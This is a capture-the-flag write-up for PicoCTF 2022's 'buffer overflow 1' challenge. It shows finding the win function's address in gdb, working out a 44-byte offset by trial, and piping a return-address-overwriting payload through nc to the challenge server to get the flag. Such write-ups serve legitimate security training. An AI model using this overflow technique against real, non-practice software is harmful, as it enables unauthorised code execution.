# PicoCTF 2022
- Challenge: buffer overflow 1
- Category: Binary Exploitation
- Points: 200
- Author: Sanjay C / Palash Oswal

## Description
Control the return address

## Writeup
We are provided an vulnerable application and its source code. The source code reveal a "win" function that prints the flag, so that's what we need to call.
But first, let's fuzz in our own pc to look for its address.

```bash
gdb vuln
layout asm
```

![GDB asm layout](https://imgur.com/QQHn6pT.png)

In `gdb`, we can look at the asm code find the address of the `win` function, which is `0x80491f6`. In little endian this will be: `f6910408`.
Now that we have the return address we want, we need to know how many characters it will take to cause the buffer overflow condition.
We could build a python script for that, but I decided to do it manually. After a few attempts I noticed that 44 characters were necessary to cause the overflow, so the next 4 characters would be the return address.

So I just sent this payload to the server and obtained the flag:

```bash
echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 52442
```

![Flag](https://imgur.com/Xlk5UyT.png)
